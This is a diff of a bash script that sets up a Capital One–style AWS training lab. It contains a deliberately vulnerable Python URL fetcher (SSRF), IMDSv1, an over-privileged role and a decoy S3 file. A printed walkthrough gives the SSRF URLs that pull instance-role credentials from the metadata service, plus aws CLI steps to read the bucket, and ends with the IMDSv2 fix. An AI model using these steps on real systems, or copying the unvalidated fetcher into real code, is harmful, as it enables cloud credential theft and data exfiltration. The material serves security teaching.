@@ -1,17 +1,18 @@
 #!/usr/bin/env bash
-# Capital One–shaped lab: misconfigured WAF (Apache + mod_proxy + ModSecurity)
-# on EC2, IMDSv1, over-privileged WAF instance role, private S3.
-# The WAF reverse-proxies /latest/ to 169.254.169.254 — that is the SSRF.
+# Capital One–shaped lab: internet-facing app on EC2 that GETs ?url=
+# (SSRF), IMDSv1, over-privileged instance role, private S3.
+# Attack URL matches the blog:
+#   http://<public-ip>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 set -euo pipefail
 
 REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}"
 NAME="capone-imds-lab"
 SUFFIX="$(openssl rand -hex 4)"
 BUCKET="imds-ssrf-lab-${SUFFIX}"
-ROLE="capone-WAF-Role"
-PROFILE_NAME="capone-WAF-Role"
-SG_NAME="${NAME}-waf"
-INSTANCE_NAME="capone-WAF"
+ROLE="capone-imds-lab-instance"
+PROFILE_NAME="capone-imds-lab-instance"
+SG_NAME="${NAME}-sg"
+INSTANCE_NAME="capone-imds-lab-web"
 
 how_to_auth() {
   cat <<'EOF'
@@ -98,7 +99,7 @@ EOF
 aws s3 cp "$TMPOBJ" "s3://${BUCKET}/secret/customer-records.txt" --region "$REGION" >/dev/null
 rm -f "$TMPOBJ"
 
-echo "==> WAF instance role (list buckets + read this bucket)"
+echo "==> instance role (list buckets + read this bucket)"
 if ! aws iam get-role --role-name "$ROLE" >/dev/null 2>&1; then
   aws iam create-role --role-name "$ROLE" --tags "Key=Project,Value=${NAME}" \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null
@@ -126,7 +127,7 @@ sleep 15
 
 echo "==> security group (tcp/80)"
 SG="$(aws ec2 create-security-group --region "$REGION" --group-name "$SG_NAME-$SUFFIX" \
-  --description "Capital One WAF lab - port 80" --vpc-id "$VPC" \
+  --description "Capital One IMDS SSRF lab - port 80" --vpc-id "$VPC" \
   --tag-specifications "ResourceType=security-group,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${SG_NAME}}]" \
   --query GroupId --output text)"
 aws ec2 authorize-security-group-ingress --region "$REGION" --group-id "$SG" \
@@ -136,55 +137,84 @@ USERDATA="$(mktemp)"
 cat >"$USERDATA" <<'UD'
 #!/bin/bash
 set -eux
-exec > /var/log/capone-waf-lab.log 2>&1
-dnf install -y httpd
-dnf install -y mod_security || true
+exec > /var/log/capone-ssrf-lab.log 2>&1
+dnf install -y nginx python3
 
-mkdir -p /var/www/waf
-cat > /var/www/waf/index.html << 'HTML'
-<!DOCTYPE html>
-<html lang="en">
-<head><meta charset="utf-8"><title>ModSecurity WAF</title></head>
-<body>
-<h1>ModSecurity WAF</h1>
-<p>Reverse proxy is up. Application traffic is inspected here.</p>
-<p>Server: Apache httpd + ModSecurity. Role: capone-WAF-Role.</p>
-</body>
-</html>
-HTML
+cat > /usr/local/bin/ssrf-fetch.py << 'PY'
+#!/usr/bin/env python3
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
+from urllib.request import urlopen
+from urllib.error import HTTPError, URLError
 
-cat > /etc/httpd/conf.d/waf-proxy.conf << 'CONF'
-# Misconfiguration (Capital One–shaped):
-# The WAF reverse-proxies /latest/ to the link-local metadata service.
-# GET http://<waf>/latest/meta-data/... is issued *by Apache on this instance*
-# to 169.254.169.254. The attacker never talks to IMDS from the internet.
-<VirtualHost *:80>
-    ServerName waf
-    DocumentRoot /var/www/waf
-    <IfModule headers_module>
-        Header always set X-WAF "ModSecurity"
-    </IfModule>
-    ProxyPreserveHost Off
-    ProxyPass        /latest/ http://169.254.169.254/latest/
-    ProxyPassReverse /latest/ http://169.254.169.254/latest/
-    <Directory /var/www/waf>
-        Require all granted
-    </Directory>
-</VirtualHost>
-CONF
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        url = (parse_qs(urlparse(self.path).query).get("url") or [""])[0]
+        if not url:
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(b"ssrf fetch: pass ?url=\n")
+            return
+        try:
+            with urlopen(url, timeout=5) as r:
+                body = r.read()
+                self.send_response(200)
+                self.send_header("Content-Type", r.headers.get_content_type() or "text/plain")
+                self.end_headers()
+                self.wfile.write(body)
+        except HTTPError as e:
+            payload = e.read() if e.fp else str(e).encode()
+            self.send_response(e.code)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(payload or f"HTTP Error {e.code}: {e.reason}".encode())
+        except URLError as e:
+            self.send_response(502)
+            self.end_headers()
+            self.wfile.write(str(e.reason).encode())
+        except Exception as e:
+            self.send_response(502)
+            self.end_headers()
+            self.wfile.write(str(e).encode())
 
-# ModSecurity: present, but do not block the metadata proxy (the misconfig).
-if [ -f /etc/httpd/conf.d/mod_security.conf ]; then
-  sed -i 's/SecRuleEngine On/SecRuleEngine DetectionOnly/' /etc/httpd/conf.d/mod_security.conf || true
-fi
+    def log_message(self, fmt, *args):
+        return
 
-systemctl enable --now httpd
-apachectl configtest || true
-systemctl restart httpd
+HTTPServer(("127.0.0.1", 8080), H).serve_forever()
+PY
+chmod +x /usr/local/bin/ssrf-fetch.py
+
+cat > /etc/systemd/system/ssrf-fetch.service << 'UNIT'
+[Unit]
+Description=SSRF url fetch (lab)
+After=network.target
+[Service]
+ExecStart=/usr/bin/python3 /usr/local/bin/ssrf-fetch.py
+Restart=always
+[Install]
+WantedBy=multi-user.target
+UNIT
+
+cat > /etc/nginx/conf.d/ssrf.conf << 'NGX'
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+    server_name _;
+    location / {
+        proxy_pass http://127.0.0.1:8080;
+        proxy_set_header Host $host;
+    }
+}
+NGX
+rm -f /etc/nginx/conf.d/default.conf /usr/share/nginx/html/index.html || true
+
+systemctl enable --now ssrf-fetch
+systemctl enable --now nginx
 echo READY > /tmp/lab-ready
 UD
 
-echo "==> EC2 t3.micro WAF, IMDSv1 (HttpTokens=optional)"
+echo "==> EC2 t3.micro SSRF fetch, IMDSv1 (HttpTokens=optional)"
 IID="$(aws ec2 run-instances --region "$REGION" \
   --image-id "$AMI" --instance-type t3.micro \
   --subnet-id "$SUBNET" --security-group-ids "$SG" \
@@ -199,9 +229,10 @@ aws ec2 wait instance-running --region "$REGION" --instance-ids "$IID"
 PUB="$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" \
   --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)"
 echo "    public_ip=$PUB"
-echo "    waiting for WAF (user-data install)..."
+echo "    waiting for fetch endpoint (user-data install)..."
 for i in $(seq 1 48); do
-  if curl -fsS -m 3 "http://${PUB}/" >/dev/null 2>&1; then
+  if curl -fsS -m 3 "http://${PUB}/fetch?url=http://127.0.0.1/" >/dev/null 2>&1 \
+     || curl -sS -m 3 -o /dev/null -w "%{http_code}" "http://${PUB}/fetch" | grep -qE '200|502'; then
     echo "    http ready"
     break
   fi
@@ -211,41 +242,37 @@ done
 cat <<EOF
 
 ============================================================
-WAF is up. IMDSv1 is allowed (HttpTokens=optional).
+SSRF fetch is up. IMDSv1 is allowed (HttpTokens=optional).
 
-This is an Apache reverse proxy (ModSecurity-shaped) that
-proxies /latest/ to the instance metadata service. That is
-the SSRF. There is no ?url= fetcher.
+The app GETs whatever you put in ?url= from the instance.
+That is the same path as the blog / screenshots.
 
 Public IP:     $PUB
 Bucket:        s3://$BUCKET/secret/customer-records.txt
 Instance:      $IID
 Role:          $ROLE
 
-WAF home:
+In the browser address bar:
 
-  http://${PUB}/
-
-Trick the WAF into fetching IMDS (browser address bar or curl):
-
-  http://${PUB}/latest/meta-data/iam/security-credentials/
+  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 then:
 
-  http://${PUB}/latest/meta-data/iam/security-credentials/${ROLE}
+  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}
 
-Then, with the JSON keys (unset AWS_PROFILE):
+Then:
 
-  aws sts get-caller-identity
-  aws s3 ls
-  aws s3 ls s3://${BUCKET} --recursive
-  aws s3 cp s3://${BUCKET}/secret/customer-records.txt -
+  aws configure --profile cloud-sec-lab
+  aws sts get-caller-identity --profile cloud-sec-lab
+  aws s3 ls --profile cloud-sec-lab
+  aws s3 ls s3://${BUCKET} --recursive --profile cloud-sec-lab
+  aws s3 cp s3://${BUCKET}/secret/customer-records.txt - --profile cloud-sec-lab
 
-Require IMDSv2:
+Require IMDSv2 (use the same AWS_PROFILE as setup):
 
   aws ec2 modify-instance-metadata-options --instance-id ${IID} --http-tokens required
 
-Reload the same /latest/ URLs. Expect HTTP 401.
+Reload the same /fetch?url= URLs. Expect HTTP 401.
 
 Destroy:
 
